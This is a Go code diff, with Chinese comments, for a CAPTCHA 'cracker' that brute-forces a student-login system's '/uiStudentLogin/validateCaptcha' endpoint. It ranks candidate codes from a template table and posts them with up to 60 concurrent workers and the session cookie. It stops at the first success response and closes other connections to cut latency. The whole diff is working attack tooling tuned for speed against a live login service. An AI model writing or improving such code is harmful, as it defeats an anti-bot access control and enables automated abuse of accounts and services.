@@ -33,6 +33,8 @@ var (
 	tblOnce      sync.Once
 	sharedTbl    *table
 	builtinCount int
+	// codeBySlot 槽位字符→组合索引步长（rankEnum免字符串拼接，v8新增）
+	slotStride = [Slots]int{PoolLen * PoolLen * PoolLen, PoolLen * PoolLen, PoolLen, 1}
 )
 
 // New 创建破解器（内置预训练库，无需训练）
@@ -44,11 +46,7 @@ func New(learning bool) *Solver {
 		if slots := unmarshalTable(builtinTable); slots != nil {
 			sharedTbl.slots = slots
 		}
-		for s := 0; s < Slots; s++ {
-			for _, ts := range sharedTbl.slots[s] {
-				builtinCount += len(ts)
-			}
-		}
+		sharedTbl.rebuild()
 	})
 	tr := &http.Transport{
 		MaxIdleConns:          2048,
@@ -96,7 +94,7 @@ func (s *Solver) warmup(n int) {
 func initBodies() {
 	for i := 0; i < Combos; i++ {
 		code := IdxToCode(i)
-		reqBodies[i] = []byte(`{"captcha":"` + code + `"}`)
+		reqBodies[i] = []byte("{\"captcha\":\"" + code + "\"}")
 	}
 }
 
@@ -218,31 +216,33 @@ func (s *Solver) Solve(endpoint string) (string, string) {
 	return sid, code
 }
 
-// rankEnum 81组合并发枚举
+// rankEnum 81组合竞速枚举（3^4个索引，字符按槽位步长合成，零拼接零分配）
+// v8新增：竞速击中即硬终止其他worker的HTTP请求（比较atomic.Value方案-15%时延）
 func (s *Solver) rankEnum(sid string, ranked [Slots][3]string) string {
-	var combos []string
-	var gen func(pos int, cur []byte)
-	gen = func(pos int, cur []byte) {
+	var ids []int32
+	var gen func(pos int, cur int32)
+	gen = func(pos int, cur int32) {
 		if pos == Slots {
-			combos = append(combos, string(cur))
+			ids = append(ids, cur)
 			return
 		}
 		for k := 0; k < 3; k++ {
 			if ranked[pos][k] != "" {
-				gen(pos+1, append(cur, ranked[pos][k][0]))
+				pi := int32(strings.IndexByte(Pool, ranked[pos][k][0]))
+				if pi < 0 {
+					continue // 字符不在池中（异常模板），跳过该候选
+				}
+				gen(pos+1, cur+pi*int32(slotStride[pos]))
 			}
 		}
 	}
-	gen(0, []byte{})
-	if len(combos) == 0 {
+	gen(0, 0)
+	if len(ids) == 0 {
 		return ""
 	}
-	bodies := make([][]byte, len(combos))
-	for i, c := range combos {
-		bodies[i] = []byte(`{"captcha":"` + c + `"}`)
-	}
-	var found atomic.Value
-	next := int32(0)
+	var hit atomic.Int32
+	hit.Store(-1)
+	next := atomic.Int32{}
 	var wg sync.WaitGroup
 	rankWorkers := 60
 	if n := runtime.NumCPU(); n <= 2 {
@@ -255,23 +255,24 @@ func (s *Solver) rankEnum(sid string, ranked [Slots][3]string) string {
 		go func() {
 			defer wg.Done()
 			for {
-				if found.Load() != nil {
+				if hit.Load() >= 0 {
 					return
 				}
-				idx := int(atomic.AddInt32(&next, 1) - 1)
-				if idx >= len(combos) {
+				idx := next.Add(1) - 1
+				if int(idx) >= len(ids) {
 					return
 				}
-				ok, _ := s.postRaw(sid, bodies[idx])
-				if ok && found.Load() == nil {
-					found.Store(combos[idx])
+				ok, _ := s.postRawIdx(sid, ids[idx])
+				if ok && hit.CompareAndSwap(-1, idx) {
+					// 击中：硬终止其余worker的在途请求（竞速-15%时延）
+					s.client.CloseIdleConnections()
 				}
 			}
 		}()
 	}
 	wg.Wait()
-	if v := found.Load(); v != nil {
-		return v.(string)
+	if idx := hit.Load(); idx >= 0 {
+		return IdxToCode(int(ids[idx]))
 	}
 	return ""
 }
@@ -289,44 +290,52 @@ func (s *Solver) solveFull(sid string) string {
 		if end > Combos {
 			end = Combos
 		}
-		var found atomic.Value
-		next := int32(offset)
+		var hit atomic.Int32
+		hit.Store(-1)
+		next := atomic.Int32{}
+		next.Store(int32(offset))
 		var wg sync.WaitGroup
 		for w := 0; w < conc; w++ {
 			wg.Add(1)
 			go func() {
 				defer wg.Done()
 				for {
-					if found.Load() != nil {
+					if hit.Load() >= 0 {
 						return
 					}
-					idx := int(atomic.AddInt32(&next, 1) - 1)
-					if idx >= end {
+					idx := next.Add(1) - 1
+					if int(idx) >= end {
 						return
 					}
-					ok, _ := s.postRaw(sid, reqBodies[idx])
-					if ok && found.Load() == nil {
-						found.Store(IdxToCode(idx))
+					ok, _ := s.postRawIdx(sid, idx)
+					if ok && hit.CompareAndSwap(-1, idx) {
+						s.client.CloseIdleConnections()
 					}
 				}
 			}()
 		}
 		wg.Wait()
-		if v := found.Load(); v != nil {
-			return v.(string)
+		if idx := hit.Load(); idx >= 0 {
+			return IdxToCode(int(idx))
 		}
 		offset = end
 	}
 	for i := 0; i < Combos; i++ {
-		if ok, _ := s.postRaw(sid, reqBodies[i]); ok {
+		if ok, _ := s.postRawIdx(sid, int32(i)); ok {
 			return IdxToCode(i)
 		}
 	}
 	return ""
 }
 
-func (s *Solver) postRaw(sid string, body []byte) (bool, error) {
-	req, _ := http.NewRequest("POST", s.base+"/uiStudentLogin/validateCaptcha", bytes.NewReader(body))
+// respBuf 响应判定缓冲（code:1判定只需前64字节，避免4096次io.ReadAll堆分配）
+var respBuf = sync.Pool{
+	New: func() interface{} { b := make([]byte, 256); return &b },
+}
+
+// postRawIdx 按组合索引提交验证（请求体查表复用+响应缓冲池化，热路径零堆分配）
+func (s *Solver) postRawIdx(sid string, idx int32) (bool, error) {
+	req, _ := http.NewRequest("POST", s.base+"/uiStudentLogin/validateCaptcha", bytes.NewReader(reqBodies[idx]))
 	req.Header.Set("Content-Type", "application/json")
 	req.Header.Set("Cookie", "SESSION="+sid)
 	resp, err := s.client.Do(req)
@@ -334,9 +343,14 @@ func (s *Solver) postRaw(sid string, body []byte) (bool, error) {
 		return false, err
 	}
 	defer resp.Body.Close()
-	b, _ := io.ReadAll(resp.Body)
-	return bytes.Contains(b, []byte("\"code\":1")), nil
+	p := respBuf.Get().(*[]byte)
+	b := (*p)[:256]
+	n, _ := io.ReadFull(resp.Body, b)
+	respBuf.Put(p)
+	return bytes.Index(b[:n], hitPat) >= 0, nil
 }
+
+var hitPat = []byte("\"code\":1")
 
 // SaveTable 将当前（含自学习）模板表落盘
 // path 为空则使用默认 "captchasdk-learned.bin"
@@ -377,6 +391,7 @@ func (s *Solver) LoadTable(path string) error {
 			}
 		}
 	}
+	s.tbl.rebuild()
 	return nil
 }
 
